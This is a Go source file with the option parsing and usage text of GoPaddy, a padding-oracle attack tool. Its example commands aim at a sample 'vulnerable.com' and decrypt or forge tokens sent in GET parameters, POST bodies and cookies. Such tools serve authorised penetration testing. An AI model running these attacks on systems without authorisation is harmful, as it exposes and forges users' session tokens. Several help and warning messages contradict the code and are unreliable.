package main

import (
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/fatih/color"
)

var usage = `
	A tool to exploit padding oracles, breaking CBC mode encryption.
	For details see link(https://en.wikipedia.org/wiki/Padding_oracle_attack)

Usage: cmd(GoPaddy [OPTIONS] [INPUT])

INPUT:
	In decrypt mode:
	the encoded (as plaintext) value of valid cipher, whose value is to be decrypted
	if not passed, GoPaddy will use bold(STDIN), reading ciphers line by line
	The provided cipher must be encoded as specified in flag(-e) and flag(-r) options.

	In encrypt mode:
	the plaintext to be encrypted
	if not passed, GoPaddy will use bold(STDIN), reading plaintexts line by line


OPTIONS:

flag(-u) *required*
	URL to request, use cipher($) character to define cipher placeholder for GET request.
	E.g. if URL is "http://vulnerable.com/?parameter=cipher($)"
	then HTTP request will be sent as "http://example.com/?parameter=cipher(payload)"
	the payload will be filled-in as a cipher, encoded using 
	specified encoder and replacement rules (see options: flag(-e), flag(-r))

flag(-err) *required*
	A padding error pattern, HTTP responses will be searched for this string to detect 
	padding oracle. Regex is supported (only response body is matched)

flag(-e)
	Encoding that server uses to present cipher as plaintext in HTTP context.
	This option is used in conjunction with flag(-r) option (see below)
	Supported values:
		b64 (standard base64) *default*
		lhex (lowercase hex)

flag(-enc)
	Encrypt mode

flag(-r)
	Character replacement rules that vulnerable server applies
	after encoding ciphers to plaintext payloads.
	Use odd-length strings, consiting of pairs of characters <OLD><NEW>.
	Example:
		If server uses base64, but replaces '/' with '!', '+' with '-', '=' with '~',
		then use cmd(-r "/!+-=~")

flag(-cookie)
	Cookie value to be set in HTTP requests.
	Use cipher($) character to define cipher placeholder.

flag(-post)
	If you want GoPaddy to perform POST requests (instead of GET), 
	then provide string payload for POST request body in this parameter.
	Use cipher($) character to define cipher placeholder. 

flag(-ct)
	Content-Type header to be set in HTTP requests.
	If not specified, Content-Type will be determined automatically.
	Only applicable if POST requests are used (see flag(-post) options).
	
flag(-b)
	Block length used in cipher (use 16 for AES)
	Supported values:
		8
		16 *default*
		32

flag(-p)
	Number of parallel HTTP connections established to target server [1-256]
		30 *default*
		
flag(-proxy)
	HTTP proxy. e.g. use cmd(-proxy "http://localhost:8080") for Burp or ZAP

flag(-nologo)
	Don't show logo. Useful when GoPaddy is used in tool chaining and called many times.

bold(Examples:)
	Decrypt token in GET parameter:
	cmd(GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" "u7bvLewln6PJ670Gnj3hnE40L0SqG8e6")
	
	POST data:
	cmd(GoPaddy -u "http://vulnerable.com/login" -post "token=$" -err "Invalid padding" "u7bvLewln6PJ670Gnj3hnE40L0SqG8e6")
	
	Cookies:
	cmd(GoPaddy -u "http://vulnerable.com/login$" -cookie "auth=$" -err "Invalid padding" "u7bvLewln6PJ670Gnj3hnE40L0SqG8e6")
	
	Encrypt token in GET parameter:
	cmd(GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" -enc "EncryptMe")

`

/* config structure is filled when command line arguments are parsed */
var config = struct {
	blockLen     *int
	parallel     *int
	URL          *string
	encoder      encoderDecoder
	paddingError *string
	proxyURL     *string
	POSTdata     *string
	contentType  *string
	cookies      []*http.Cookie
	termWidth    int
	encrypt      *bool
	nologo       *bool
}{}

func init() {
	// add some color to usage text
	re := regexp.MustCompile(`\*required\*`)
	usage = string(re.ReplaceAll([]byte(usage), []byte(yellow(`(required)`))))

	re = regexp.MustCompile(`\*default\*`)
	usage = string(re.ReplaceAll([]byte(usage), []byte(green(`(default)`))))

	re = regexp.MustCompile(`cmd\(([^\)]*?)\)`)
	usage = string(re.ReplaceAll([]byte(usage), []byte(cyan("$1"))))

	re = regexp.MustCompile(`cipher\(([^\)]*?)\)`)
	usage = string(re.ReplaceAll([]byte(usage), []byte(cyanBold("$1"))))

	re = regexp.MustCompile(`flag\(([^\)]*?)\)`)
	usage = string(re.ReplaceAll([]byte(usage), []byte(greenBold("$1"))))

	re = regexp.MustCompile(`link\(([^\)]*?)\)`)
	usage = string(re.ReplaceAll([]byte(usage), []byte(underline("$1"))))

	re = regexp.MustCompile(`bold\(([^\)]*?)\)`)
	usage = string(re.ReplaceAll([]byte(usage), []byte(bold("$1"))))

	// get terminal width
	config.termWidth = terminalWidth()
	if config.termWidth == -1 {
		argWarning("", "Couldn't determine your terminal width. Falling back to 80")
		config.termWidth = 80 // fallback
	}

	// a custom usage
	flag.Usage = func() {
		printLogo()
		fmt.Fprintf(color.Error, usage)
	}
}

// error printing function, used when checking passed values
var hadErrors bool

func argError(flag string, text string) {
	_, err := fmt.Fprintln(color.Error, red(fmt.Sprintf("Parameter %s: %s", flag, text)))
	if err != nil {
		log.Fatal(err)
	}
	// set this flag
	hadErrors = true
}

func argWarning(flag string, text string) {
	var err error
	if flag != "" {
		_, err = fmt.Fprintln(color.Error, yellow(fmt.Sprintf("Parameter %s: %s", flag, text)))
	} else {
		_, err = fmt.Fprintln(color.Error, yellow(fmt.Sprintf("%s", text)))
	}
	if err != nil {
		log.Fatal(err)
	}
}

func parseCookies(cookies string) (cookSlice []*http.Cookie, err error) {
	// strip quotes if any
	cookies = strings.Trim(cookies, `"'`)

	// split several cookies into slice
	cookieS := strings.Split(cookies, ";")

	for _, c := range cookieS {
		// strip whitespace
		c = strings.TrimSpace(c)

		// split to name and value
		nameVal := strings.SplitN(c, "=", 2)
		if len(nameVal) != 2 {
			return nil, errors.New("failed to parse cookie")
		}

		cookSlice = append(cookSlice, &http.Cookie{Name: nameVal[0], Value: nameVal[1]})
	}
	return cookSlice, nil
}

func determineContentType(data string) string {
	var contentType string

	if data[0] == '{' || data[0] == '[' {
		contentType = "application/json"
	} else {
		match, _ := regexp.MatchString("([^=]*?=[^=]*?&?)+", data)
		if match {
			contentType = "application/x-www-form-urlencoded"
		} else {
			contentType = http.DetectContentType([]byte(data))
		}
	}
	return contentType
}

func parseArgs() (ok bool, cipher *string) {

	// set-up the flags
	config.URL = flag.String("u", "", "")
	encoding := flag.String("e", "b64", "")
	replacements := flag.String("r", "", "")
	cookies := flag.String("cookie", "", "")

	config.paddingError = flag.String("err", "", "")
	config.blockLen = flag.Int("b", 16, "")
	config.parallel = flag.Int("p", 30, "")
	config.proxyURL = flag.String("proxy", "", "")
	config.POSTdata = flag.String("post", "", "")
	config.contentType = flag.String("ct", "", "")
	config.encrypt = flag.Bool("enc", false, "")
	config.nologo = flag.Bool("nologo", false, "")

	// parse
	flag.Parse()

	if flag.NFlag() == 0 {
		flag.Usage()
		return false, nil
	}

	// check values
	var err error

	// URL
	if *config.URL == "" {
		argError("-u", "Must be specified")
	} else {
		_, err = url.Parse(*config.URL)
		if err != nil {
			argError("-u", "Failed to parse URL: "+err.Error())
		}
	}

	// encoding and replacement
	if len(*replacements)%2 == 1 {
		argError("-r", "String must be of even length")
	} else {
		switch *encoding {
		case "b64":
			config.encoder = createBase64EncoderDecoder(*replacements)
		case "lhex":
			config.encoder = createLowerHexEncoderDecoder(*replacements)
		default:
			argError("-e", "Unsupported encoding specified")
		}
	}

	// padding error string
	if *config.paddingError == "" {
		argError("-err", "Must be specified")
	}

	// block length
	switch *config.blockLen {
	case 8:
	case 16:
	case 32:
	default:
		argError("-b", "Unsupported value passed")
	}

	// parallel connections
	if *config.parallel < 1 {
		argWarning("-p", "Cannot be less than 1, value corrected to default value (100)")
		*config.parallel = 100
	} else if *config.parallel > 256 {
		argWarning("-p", "Cannot be greater than 256, value corrected to 256")
		*config.parallel = 256
	}

	// content-type
	if *config.POSTdata != "" && *config.contentType == "" {
		// if not passed, determine automatically
		var ct string
		ct = determineContentType(*config.POSTdata)
		config.contentType = &ct
		argWarning("", "Content-Type was determined automatically as: "+ct)
	}

	// cookies
	if *cookies != "" {
		config.cookies, err = parseCookies(*cookies)
		if err != nil {
			argError("-cookie", err.Error())
		}
	}

	// general check on URL, POSTdata or Cookies for having the $ placeholder
	match1, err := regexp.MatchString(`\$`, *config.URL)
	if err != nil {
		argError("-u", err.Error())
	}
	match2, err := regexp.MatchString(`\$`, *config.POSTdata)
	if err != nil {
		argError("-post", err.Error())
	}
	match3, err := regexp.MatchString(`\$`, *cookies)
	if err != nil {
		argError("-cookie", err.Error())
	}
	if !(match1 || match2 || match3) {
		argError("-u, -post, -cookie", "Either URL, POST data or Cookie must contain the $ placeholder")
	}

	// decide on cipher source
	switch flag.NArg() {
	case 0:
		// no cipher passed, STDIN will be used
	case 1:
		// cipher is passed
		cipher = &flag.Args()[0]
	default:
		// too many positional arguments
		argError("[CIPHER]", "Too many arguments specified, specify exactly one string, or leave empty to read from STDIN")
	}

	// print info about errors occurred
	if hadErrors {
		fmt.Fprintf(color.Error, fmt.Sprintf("\nRun with %s option to see usage help\n\n", cyanBold("-h")))
		ok = false
		return
	}

	ok = true
	return
}
